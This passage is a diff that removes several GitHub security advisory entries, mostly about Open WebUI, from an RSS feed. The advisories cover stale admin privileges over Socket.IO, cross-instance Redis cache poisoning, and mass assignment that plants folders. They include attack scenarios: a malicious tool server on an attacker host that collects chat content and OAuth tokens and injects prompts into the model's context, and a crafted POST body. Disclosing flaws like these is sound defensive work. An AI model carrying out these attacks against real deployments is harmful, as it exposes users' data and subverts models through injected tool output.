-The same bypass occurs if the user is deleted entirely (`delete_user_by_id`) — the deleted user retains admin privileges on their live socket until disconnection.&#13;
-&#13;
-## Impact&#13;
-&#13;
-- Read access to any user's notes after admin privileges have been revoked&#13;
-- Write access (content injection, overwrite) to any user's notes under the same conditions&#13;
-- The stale privilege is bounded only by the attacker's willingness to keep the Socket.IO connection alive; heartbeats extend the session indefinitely&#13;
-- Official admin demotion or user deletion gives a false sense of security — HTTP access is correctly revoked, but real-time collaborative access silently continues&#13;
-&#13;
-## Preconditions&#13;
-&#13;
-- Attacker must have an active Socket.IO connection established while they held admin role&#13;
-- Attacker must retain the Socket.IO session after demotion/deletion (trivial — just don't close the browser)</description>
-      <guid isPermaLink="false">GHSA-45m8-cpm2-3v65</guid>
-      <pubDate>Tue, 05 May 2026 11:18:29 +0000</pubDate>
-    </item>
-    <item>
-      <title>[HIGH] open-webui/open-webui – Redis Cache Keys tool_servers and terminal_servers Missing Instance Prefix Enable Cross-Instance Cache Poisoning</title>
-      <link>https://github.com/open-webui/open-webui/security/advisories/GHSA-3x8w-4f7p-xxc2</link>
-      <description># Redis Cache Keys tool_servers and terminal_servers Missing Instance Prefix Enable Cross-Instance Cache Poisoning&#13;
-&#13;
-## Affected Component&#13;
-&#13;
-Tool server and terminal server Redis cache:&#13;
-- `backend/open_webui/utils/tools.py` (line 841, tool_servers SET)&#13;
-- `backend/open_webui/utils/tools.py` (line 850, tool_servers GET)&#13;
-- `backend/open_webui/utils/tools.py` (line 976, terminal_servers SET)&#13;
-- `backend/open_webui/utils/tools.py` (line 986, terminal_servers GET)&#13;
-&#13;
-## Affected Versions&#13;
-&#13;
-Current main branch (commit `6fdd19bf1`) and likely all versions since the tool server / terminal server Redis cache was introduced.&#13;
-&#13;
-## Description&#13;
-&#13;
-Open WebUI uses a `REDIS_KEY_PREFIX` (default `open-webui`) to namespace Redis keys, allowing multiple instances to safely share a single Redis backend. Every Redis key in the codebase uses this prefix — except the `tool_servers` and `terminal_servers` keys in `utils/tools.py`, which use bare key names.&#13;
-&#13;
-When two or more Open WebUI instances share a Redis database (a supported and documented deployment pattern, e.g., for multi-region deployments, blue-green setups, or cluster topologies), the unprefixed keys collide. An admin on Instance A writing to `tool_servers` overwrites the value read by Instance B — causing Instance B's users to receive Instance A's tool server configuration.&#13;
-&#13;
-```python&#13;
-# utils/tools.py — unprefixed keys (problem)&#13;
-await request.app.state.redis.set('tool_servers', ...)        # line 841&#13;
-json.loads(await request.app.state.redis.get('tool_servers')) # line 850&#13;
-await request.app.state.redis.set('terminal_servers', ...)    # line 976&#13;
-json.loads(await request.app.state.redis.get('terminal_servers'))  # line 986&#13;
-&#13;
-# Every other Redis key in the codebase — prefixed (correct pattern)&#13;
-f'{REDIS_KEY_PREFIX}:auth:token:{jti}:revoked'&#13;
-f'{REDIS_KEY_PREFIX}:ratelimit:{email}:{bucket}'&#13;
-f'{REDIS_KEY_PREFIX}:tasks:commands'&#13;
-```&#13;
-&#13;
-## Attack Scenario&#13;
-&#13;
-Two Open WebUI instances (A and B) share a Redis backend — a supported deployment for multi-region setups, blue-green deployments, or hot-standby. Both instances have their own admin accounts; the shared Redis was chosen for coordinated session handling, rate limiting, and task management.&#13;
-&#13;
-1. Attacker is an admin on Instance A (a legitimately provisioned admin, or one that escalated via any available path including the LDAP empty-password or stale-admin-role findings).&#13;
-2. Attacker on Instance A configures a tool server pointing to `https://attacker-controlled.example.com/openapi.json`. This triggers `utils/tools.py:841` to write the new tool server list under the bare key `tool_servers`.&#13;
-3. Instance B's users query tools. Instance B reads from `tool_servers` (line 850) — gets Instance A's poisoned list, which now includes the attacker's server alongside or instead of Instance B's legitimate tool servers.&#13;
-4. Instance B's users invoke tools through the model's context. The attacker's server receives tool call payloads containing: chat content, user identity, OAuth tokens scoped to the tool server (if the user has bound their external account), and in-flight conversation context.&#13;
-5. The attacker's server returns arbitrary tool responses, which are fed back into Instance B's LLM context as "trusted tool output" — enabling prompt injection, misinformation delivery, and further data exfiltration cascades.&#13;
-&#13;
-The same cross-instance poisoning applies to `terminal_servers`.&#13;
-&#13;
-## Impact&#13;
-&#13;
-- Cross-instance cache poisoning: an admin on one instance affects all users of another instance sharing the Redis backend&#13;
-- Data exfiltration: tool call payloads contain chat content and user identity, delivered to the attacker's server&#13;
-- Prompt injection delivery: attacker-returned tool responses enter the victim instance's LLM context as trusted data&#13;
-- Undermines the multi-instance isolation guarantee that `REDIS_KEY_PREFIX` was introduced to provide&#13;
-- Silent failure mode: no error is raised; the victim instance sees a valid, signed cache entry and has no way to detect it came from a different instance&#13;
-&#13;
-## Preconditions&#13;
-&#13;
-- Multiple Open WebUI instances share a single Redis backend (a supported and documented deployment)&#13;
-- Attacker has admin access on one of the instances (or escalates to admin via any available path)</description>
-      <guid isPermaLink="false">GHSA-3x8w-4f7p-xxc2</guid>
-      <pubDate>Tue, 05 May 2026 11:18:22 +0000</pubDate>
-    </item>
-    <item>
-      <title>[MEDIUM] open-webui/open-webui – Mass Assignment via Pydantic extra='allow' Allows Creating Folders in Other Users' Accounts</title>
-      <link>https://github.com/open-webui/open-webui/security/advisories/GHSA-hr43-rjmr-7wmm</link>
-      <description># Mass Assignment via Pydantic extra='allow' Allows Creating Folders in Other Users' Accounts&#13;
-&#13;
-## Affected Component&#13;
-&#13;
-Folder creation endpoint and form model:&#13;
-- `backend/open_webui/models/folders.py` (lines 72-77, `FolderForm` with `extra='allow'`)&#13;
-- `backend/open_webui/models/folders.py` (lines 95-106, `insert_new_folder` dict construction)&#13;
-- `backend/open_webui/routers/folders.py` (line 119, `create_folder` endpoint)&#13;
-&#13;
-## Affected Versions&#13;
-&#13;
-Current main branch (commit `6fdd19bf1`) and likely all versions since `FolderForm` adopted `extra='allow'`.&#13;
-&#13;
-## Description&#13;
-&#13;
-`FolderForm` uses `model_config = ConfigDict(extra='allow')`, which permits arbitrary fields to pass through Pydantic validation and be included in `model_dump(exclude_unset=True)`. In `insert_new_folder`, the server-assigned `user_id` is placed at the start of the dict and then overwritten by the spread of form data:&#13;
-&#13;
-```python&#13;
-# models/folders.py:95-106&#13;
-folder = FolderModel(&#13;
-    **{&#13;
-        'id': id,                                              # server&#13;
-        'user_id': user_id,                                    # server — overwritten below&#13;
-        **(form_data.model_dump(exclude_unset=True) or {}),    # user-controlled (extra='allow')&#13;
-        'parent_id': parent_id,&#13;
-        'created_at': int(time.time()),&#13;
-        'updated_at': int(time.time()),&#13;
-    }&#13;
-)&#13;
-```&#13;
-&#13;
-Because `FolderModel` declares `user_id: str` as a real field (not just a form extra), any attacker-supplied `user_id` in the POST body is accepted by the model and persisted on the `Folder` row.&#13;
-&#13;
-## Attack Scenario&#13;
-&#13;
-1. Attacker discovers a victim's user ID. User UUIDs commonly leak via the user search endpoint (`GET /api/v1/users/search`, intentionally accessible to verified users for sharing UI), shared chat metadata, or channel member lists.&#13;
-2. Attacker sends:&#13;
-   ```&#13;
-   POST /api/v1/folders/&#13;
-   {&#13;
-     "name": "Important: Click here",&#13;
-     "user_id": "&lt;victim_user_id&gt;",&#13;
-     "meta": {"icon": "warning"},&#13;
-     "data": {...}&#13;
-   }&#13;
-   ```&#13;
-3. Pydantic accepts the extra `user_id` field (allowed by `extra='allow'`).&#13;
-4. `insert_new_folder` spreads the form data over the server-set `'user_id': user_id`, overwriting it with the attacker's value.&#13;
-5. The `Folder` row is persisted with `user_id = &lt;victim_user_id&gt;`.&#13;
-6. The victim sees the attacker-planted folder in their UI on next load because `GET /api/v1/folders/` filters by the viewer's own `user_id`.&#13;
-&#13;
-The attacker can repeat this to plant multiple folders, use crafted `name` values for phishing ("Click here to recover account" / "Security alert"), and abuse the `meta` and `data` fields to add visual elements that further mimic legitimate content.&#13;
-&#13;
-## Impact&#13;
-&#13;
-- Unauthorized write into victim's folder tree&#13;
-- Phishing surface: attacker-controlled `name`, `meta`, and `data` render in the victim's UI in a trusted context&#13;
-- DoS / spam: attacker can flood a victim with arbitrary folders; victim must manually delete each one&#13;
-- Attacker cannot read the folder back — all read paths filter by the caller's own `user_id` — so confidentiality is preserved, but integrity and trust are compromised&#13;
-&#13;
-## Preconditions&#13;
-&#13;
-- Attacker must have an authenticated account with `features.folders` permission (default for all users)&#13;
-- Attacker must know or guess the victim's user UUID (obtainable through various non-sensitive endpoints)</description>
-      <guid isPermaLink="false">GHSA-hr43-rjmr-7wmm</guid>
-      <pubDate>Tue, 05 May 2026 11:18:11 +0000</pubDate>
     </item>
     <item>
       <title>[CRITICAL] argoproj/argo-cd – Kubernetes Secret Extraction via ArgoCD ServerSideDiff</title>
